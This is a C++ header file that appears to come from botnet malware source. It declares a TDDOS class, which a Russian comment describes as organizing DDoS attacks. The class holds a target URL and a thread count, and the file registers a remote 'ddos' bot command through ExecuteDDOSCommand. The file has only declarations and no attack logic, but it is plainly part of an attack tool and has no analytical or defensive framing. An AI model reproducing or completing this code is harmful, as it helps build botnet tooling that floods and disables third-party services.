
#ifndef ddosH
#define ddosH
//----------------------------------------------------------------------------

#include "windows.h"
#include "Strings.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include <WinSock.h>





// Класс организации DDOS атак
class TDDOS : public TBotObject
{
private:
	THTTPRequest FRequest;
	LPHOSTENT    FHostAddres;
	string FSendData;

	friend DWORD WINAPI DDOSThreadProc(TDDOS *DDOS);
public:
	string URL;
	DWORD  MaxThreads;

	TDDOS();
	~TDDOS();

	bool Execute();
};



bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

const char CommandDDOS[] = "ddos\0";//


//----------------------------------------------------------------------------
#endif
